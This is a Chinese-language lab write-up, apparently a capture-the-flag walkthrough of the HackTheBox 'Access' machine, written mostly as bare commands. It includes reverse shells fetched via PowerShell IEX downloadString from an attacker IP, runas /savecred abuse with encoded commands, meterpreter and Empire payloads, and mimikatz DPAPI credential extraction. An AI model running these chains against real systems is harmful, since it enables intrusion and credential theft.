# HackTheBox-Access

## nmap扫描
        nmap -sC -sV -oA nmap/access 10.10.10.98

## ftp端口
        ftp 10.10.10.98
        (输入<user:password>:<anonymous:anonymous>)
        // 下载文件(wget方式)
        wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98
        mv 10.10.10.98/ ftp cd ftp
        cd Engineer 
        unzip xxx.zip
        7z x xxx.zip
        7z l -slt xxx.zip

## 破解压缩密码
        zip2john xxx.zip > xxx.hash

### Microsoft数据库
#### Method 1:
        file xxx.mdb
        strings -n 8 xxx.mdb | sort -u > wordlist
        john xxx.hash --wordlist=wordlist --show

#### Method 2: 
        mdb-sql xxx.mdb
        => list tables
        => go
        // 或者
        mdb-tables xxx.mdb
        for i in $(mdb-tables backup.mdb); do echo $i; done
        for i in $(mdb-tables backup.mdb); do mdb-export backup.mdb $i > tables/$i; done
        cd tables
        du -s * | sort -nr
        wc -l * | sort -n 
        (忽视所有只有一行的数据库，这种数据库只有列名)
    
## 分析xxx.pst
        exiftool xxx.pst
        file xxx.pst
        readpst xxx.pst
        less xxx.mbox
        (得到telnet用户名和密码)

## telnet端口
        telnet 10.10.10.98
        (输入<login:password>)
        type C:\windows\system32\login.cmd
        cd C:\Users\security\Desktop
        (New-Object Net.WebClient).downloadFile('http://myip:8000/mimikatz.exe', 'mimikatz.exe')
        .\mimikatz.exe


## 80端口（网页）
        wget http://10.10.10.98/out.jpg
        exiftool out.jpg
        string out.jpg

## gobuster扫描
        gobuster -u http://10.10.10.98 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

## 提权(nishang)
        mkdir www
        cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 ./reverse.ps1
        python -m SimpleHTTPServer 
        nc -lvnp 9001
        > powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.101:8000/reverse.ps1')"
        cd /opt/JAWS
        git pull
        cp /opt/JAWS/jaws-enum.ps1 .
        > IEX(New-Object Net.WebClient).downloadString('http://10.10.16.101:8000/jaws-enum.ps1')

### 查看JAWS搜集的信息
        vi notes
        login.md
        > cmdkey /list
        > cd inetpub
        > cd wwwroot

# HackTheBox-Access

## nmap扫描
                nmap -sC -sV -oA nmap/access 10.10.10.98

## telnet服务
                telnet 10.10.10.98
## ftp服务
                ftp 10.10.10.98(<user:password>:anonymous:anonymous)

                wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98

## http服务
                http://10.10.10.98
                http://10.10.10.98/robots.txt
                wget http://10.10.10.98/out.jpg
                exiftool out.jpg
                strings out.jpg

                gobuster -u http://10.10.10.98 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

## poke around ftp文件
                7z xxx.zip
                7z l -slt xxx.zip
                zip2john xxx.zip > xxx.hash
                file xxx.mdb
                apt install mdbtools
                strings -n 8 xxx.mdb | sort -u > wordlist
                mdbtools xxx.mdb

## john破解压缩包密码
                john xxx.hash --wordlist=wordlist
                john xxx.hash --show
                7z x xxx.zip
## mdb工具使用
                mdb-sql xxx.mdb
                => list tables
                => go 
                mdb-tables xxx.mdb
                for i in $(mdb-tables xxx.mdb); do mdb-export xxx.mdb $i > tables/$i; done
                du -s * // 查看文件大小
                wc -l * | sort -n // 按行数排列文件
                cat auth_user

## pst(microsoft email outlook folder)查看工具
                readpst xxx.pst
                less xxx.mbox
                (获得<user:password>)
                telnet 10.10.10.98
                (输入<user:password>)

## 提权
                > whoami
                > hostname
                > cd Desktop
                > powershell whoami
                mkdir www  cd www cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 ./reverse.ps1
                > powershell "IEX(New-Object Net.WebClient).downloadString('http://myip:8000/reverse.ps1')"
                > cmdkey /list
                > cd C:\inetpub\wwwroot
                > cd C:\Users\Public\Desktop
                > get-content "xxx.lnk"
                > $Wscript = New-Object -ComObject Wscript.Shell
                > $shortcut = Get-ChildItem *.lnk
                > $shortcut
                > $Wscript.CreateShortcut($shortcut)
                > runas /user:ACCESS\Administrator /savecred "whoami > C:\Users\Public\Desktop\test"
                > runas /user:ACCESS\Administrator /savecred "powershell """IEX(New-Object Net.WebClient).downloadString('http://myip:8000/9002.ps1')"""" \\ 失败
                > echo -n "IEX(New-Object Net.WebClient).downloadString('http://myip:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w 0

                > runas /user:ACCESS\Administrator /savecred "powershell -EncodedCommand <base64 code>"

## JAWS扫描
                cp /opt/JAWS/jaws-enum.ps1 ./jaws.ps1
                > IEX(New-Object Net.WebClient).downloadString('http://myip:8000/jaws.ps1')
                
### 扫描notes
                C:\windows\system32\login.cmd
                FPSensor
                

## mimikatz
                mv /opt/mimikatz/x64/mimikatz.exe ./www/
                > (New-Object Net.WebClient).downloadFile('http://myip:8000/mimikatz.exe', 'mimikatz.exe')
        
### applocker bypass list // 失败
                copy mimikatz.exe C:\windows\system32\spool\drivers\color\

### meterpreter 
                cd /opt/unicorn
                python unicorn.py windows/meterpreter/reverse_https myip 9003
                cp powershell_attack.txt ~/boxes/access/www/msf.ps1
                cp unicorn.rc ~/boxes/access
                msfconsole -r unicorn.rc
                echo -n "IEX(New-Object Net.WebClient).downloadString('http://myip:8000/msf.ps1')" | iconv --to-code UTF-16LE | base64 -w 0

### empire
                cd /opt/Empire/setup
                ./reset.sh
                (Empire) > listeners
                (Empire: listeners) > uselistener
                (Empire: listeners/http) > uselistener http
                (Empire: listeners/http) > set Host http://myip:9004
                (Empire: listeners/http) > set BindIP myip
                (Empire: listeners/http) > set Port 9004
                (Empire: listeners/http) > execute
                (Empire: listeners) > back
                (Empire: listeners) > launcher powershell http
                vi empire.ps1 // 黏贴以上输出内容
                echo -n "IEX(New-Object Net.WebClient).downloadString('http://myip:8000/empire.ps1')" | iconv --to-code UTF-16LE | base64 -w 0
                (Empire: listeners) > uselistener meterpreter
                (Empire: listeners/meterpreter) > set Host http://myip:9003 
                (Empire: listeners/meterpreter) > set Port 9003
                (Empire: listeners/meterpreter) > execute
                (Empire: listeners) > back
                (Empires) > interact xxx
                (Empires: xxx) > injectshellcode meterpreter  
                (Empires: powershell/code_execution/invoke_shellcode) > info
                (Empires: powershell/code_execution/invoke_shellcode) > execute

### msfconsole
                msfdb run
                msf5 > handler -H myip -P 9003 -p windows/meterpreter/reverse_http
                (Empire) > execute
                msf5 > sessions -i 1
                meterpreter > load kiwi
                meterpreter > ps
                meterpreter > migrate <cmd.exe-psid>
                meterpreter > kiwi_cmd '"dpapi::"'
                mimikatz '"privilege::debug" "sekurlsa::logonpasswords" "<command::args>"'

#### dpapi harj0y
                meterpreter > ls /users/security/appdata
                meterpreter > ls /users/security/appdata/Roaming/Microsoft/Protect
                // 查看用户SSID
                meterpreter > ls /users/security/appdata/Roaming/Microsoft/Protect
                meterpreter > cd /users/security/appdata/Roaming/Microsoft/Protect/<SID>
                meterpreter > dir pwd
                meterpreter > kiwi_cmd '"dpapi::masterkey /in:\users\security\appdata\Roaming\Microsoft\Protect\<SID>\<FID>"'
                meterpreter > kiwi_cmd '"dpapi::masterkey /in:<FID>"'
                // 获取masterkey文件
                meterpreter > download 0*
                meterpreter > download 4*
                // 获取credential文件
                meterpreter > download 51*
                // 若链接断开
                (Empires: powershell/code_execution/invoke_shellcode) > run
                meterpreter > sessions -i 2
                meterpreter > cd /users/security/appdata/Roaming/Microsoft/Protect/<SID>

                (Empire) > searchmodule mimikatz
                (Empire) > usemodule powershell/credentials/mimikatz/command
                (Empire: usemodule powershell/credentials/mimikatz/command) > info
                (Empire: usemodule powershell/credentials/mimikatz/command) > set Agent <session-id>
                (Empire: usemodule powershell/credentials/mimikatz/command) > set Command answer
                (Empire: usemodule powershell/credentials/mimikatz/command) > run //失败
                
### 搭建smb服务器将文件传到windows机器上
                smbserver -smb2support jason 'pwd'

### 在windows机器上运行mimikatz
                mimikatz # cd <masterkey目录> 
                // 用新的(旧的)masterkey文件得到用户key以及管理账户
                mimikatz # dpapi::masterkey /in:<masterkey> /sid:<SID> /password:<password>
                mimikatz # dpapi::credhist /in:<cred-file> 

### 登录管理员账户
                telnet 10.10.10.98
                (<user:password>:<Administrator:password>)

                

                
## 查看john日志
                cat ~/.john/john.log